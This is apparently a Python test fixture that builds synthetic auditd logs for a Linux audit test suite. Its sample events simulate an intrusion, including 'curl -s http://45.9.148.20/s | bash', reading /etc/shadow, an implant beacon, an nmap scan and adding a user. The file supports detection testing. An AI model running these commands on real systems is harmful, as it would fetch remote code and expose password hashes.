"""Synthetic auditd logs for the linux_audit test-suite."""

from __future__ import annotations

import binascii
import gzip
from pathlib import Path


def _hex(s: str) -> str:
    return binascii.hexlify(s.encode()).decode()


def _proctitle(argv: list[str]) -> str:
    return binascii.hexlify(b"\x00".join(a.encode() for a in argv)).decode()


def execve_event(ts, serial, argv, *, exe=None, cwd="/root", uid="1000",
                 auid="1000", pid="4020", ppid="4000", key="", success="yes",
                 arch="c000003e", paths=None):
    exe = exe or f"/usr/bin/{argv[0]}"
    a = f"audit({ts}:{serial})"
    lines = [
        f'type=SYSCALL msg={a}: arch={arch} syscall=59 success={success} '
        f'exit=0 a0=1 a1=2 a2=3 items=2 ppid={ppid} pid={pid} auid={auid} '
        f'uid={uid} gid=0 euid={uid} suid={uid} fsuid={uid} tty=pts0 '
        f'ses=3 comm="{argv[0]}" exe="{exe}"'
        + (f' key="{key}"' if key else " key=(null)"),
        f'type=EXECVE msg={a}: argc={len(argv)} '
        + " ".join(f'a{i}="{arg}"' for i, arg in enumerate(argv)),
        f'type=CWD msg={a}: cwd="{cwd}"',
        f'type=PROCTITLE msg={a}: proctitle={_proctitle(argv)}',
    ]
    for i, pth in enumerate(paths or []):
        lines.insert(3, f'type=PATH msg={a}: item={i} name="{pth}" '
                        f'nametype=NORMAL')
    return "\n".join(lines)


def user_cmd_event(ts, serial, cmd, *, auid="1000", uid="1000", acct="deploy",
                   res="success", term="pts/1", addr="?"):
    a = f"audit({ts}:{serial})"
    return (f"type=USER_CMD msg={a}: pid=5000 uid={uid} auid={auid} ses=3 "
            f'msg=\'cwd="/home/{acct}" cmd={_hex(cmd)} '
            f'terminal={term} res={res}\' UID="{acct}" AUID="{acct}"')


def user_auth_event(ts, serial, *, acct="root", res="failed",
                    addr="45.9.148.20", exe="/usr/sbin/sshd"):
    a = f"audit({ts}:{serial})"
    return (f"type=USER_AUTH msg={a}: pid=1777 uid=0 auid=4294967295 ses=4 "
            f'msg=\'op=PAM:authentication acct="{acct}" exe="{exe}" '
            f'hostname={addr} addr={addr} terminal=ssh res={res}\'')


def add_user_event(ts, serial, *, acct="svc-backup", res="success"):
    a = f"audit({ts}:{serial})"
    return (f"type=ADD_USER msg={a}: pid=6001 uid=0 auid=1000 ses=3 "
            f'msg=\'op=adding-user id=1337 exe="/usr/sbin/useradd" '
            f'hostname=host01 addr=? terminal=pts/1 res={res}\' '
            f'ID="{acct}"')


def config_change_event(ts, serial):
    a = f"audit({ts}:{serial})"
    return (f"type=CONFIG_CHANGE msg={a}: op=remove_rule key=(null) list=4 "
            f"res=1")


def avc_event(ts, serial):
    a = f"audit({ts}:{serial})"
    return (f'type=AVC msg={a}: avc:  denied  {{ execute }} for  pid=7000 '
            f'comm="httpd" name="sh" dev="dm-0" ino=131 '
            f'scontext=system_u:system_r:httpd_t:s0 '
            f'tcontext=system_u:object_r:shell_exec_t:s0 tclass=file '
            f"permissive=0")


def connect_event(ts, serial, ip, port, *, comm="curl", exe="/usr/bin/curl"):
    a = f"audit({ts}:{serial})"
    fam = f"0200{port:04x}" + "".join(f"{int(o):02x}" for o in ip.split("."))
    fam = fam + "0" * (32 - len(fam))
    return (f'type=SYSCALL msg={a}: arch=c000003e syscall=42 success=yes '
            f'exit=0 ppid=4000 pid=7100 auid=1000 uid=1000 gid=0 ses=3 '
            f'comm="{comm}" exe="{exe}" key="net-out"\n'
            f'type=SOCKADDR msg={a}: saddr={fam}')


def write_log(path: Path, events, *, gz=False) -> Path:
    text = "\n".join(events) + "\n"
    if gz:
        path.write_bytes(gzip.compress(text.encode()))
    else:
        path.write_text(text)
    return path


def default_log(root: Path, *, name="audit.log", gz=False) -> Path:
    d = root / "var/log/audit"
    d.mkdir(parents=True, exist_ok=True)
    base = 1_768_435_200
    events = [
        execve_event(f"{base}.100", 101, ["ls", "-la", "/etc"], key="watch-etc",
                     paths=["/etc"]),
        execve_event(f"{base}.200", 102, ["gcc", "-o", "/tmp/x", "x.c"],
                     exe="/usr/bin/gcc"),
        execve_event(f"{base}.300", 103, ["/tmp/.s/impl", "--beacon"],
                     exe="/tmp/.s/impl", auid="0", uid="0"),
        execve_event(f"{base}.350", 104, ["nmap", "-sS", "10.0.0.0/24"],
                     exe="/usr/bin/nmap"),
        execve_event(f"{base}.400", 105,
                     ["bash", "-c", "curl -s http://45.9.148.20/s | bash"],
                     exe="/bin/bash"),
        execve_event(f"{base}.420", 106, ["cat", "/etc/shadow"],
                     paths=["/etc/shadow"], key="identity"),
        user_auth_event(f"{base}.500", 107, res="failed"),
        user_cmd_event(f"{base}.600", 108, "/bin/systemctl restart web",
                       res="success"),
        user_cmd_event(f"{base}.650", 109, "/usr/bin/id", res="failed"),
        add_user_event(f"{base}.700", 110),
        config_change_event(f"{base}.800", 111),
        avc_event(f"{base}.900", 112),
        connect_event(f"{base}.950", 113, "45.9.148.20", 443),
    ]
    return write_log(d / name, events, gz=gz)
